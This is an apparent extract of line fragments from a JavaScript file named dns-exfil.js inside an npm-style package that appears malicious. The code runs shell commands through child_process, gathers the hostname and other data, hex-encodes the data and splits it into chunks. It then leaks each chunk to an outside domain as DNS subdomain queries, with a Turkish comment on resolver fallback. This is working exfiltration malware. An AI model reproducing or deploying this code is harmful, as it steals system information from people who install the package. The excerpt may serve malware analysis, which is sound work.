// File: tmp/tmpjnbgjeod/personalizationtrkserv/package/dns-exfil.js
// ======================================================================
Line 4: const dns = require("dns")
Line 5: const os  = require("os")
Line 6: _tmp_4 = require("child_process")
Line 10: execSync(cmd, {stdio:["ignore","pipe","ignore"]}).toString().trim()
Line 13: {
  const out = [];
  for (let i = 0; i < str.length; i += n) out.push(str.slice(i, i + n));
  return out;
}
Line 14: const out = []
Line 15: out.push(str.slice(i, i + n))
Line 22: os.hostname()
Line 35: Buffer.from(JSON.stringify(payload), "utf8").toString("hex")
Line 43: Math.random().toString(36)
Line 48: {
  const qname = `${nonce}.${idx}.${total}.${parts[idx]}.${BASE}`;

  // Çoğu resolver biri başarısızsa diğerini dener
  try { dns.resolve4(qname, () => {}); } catch {}
  try { dns.resolve6(qname, () => {}); } catch {}
}
Line 49: const qname = `${nonce}.${idx}.${total}.${parts[idx]}.${BASE}`
Line 52: dns.resolve4(qname, () => {})
Line 53: dns.resolve6(qname, () => {})
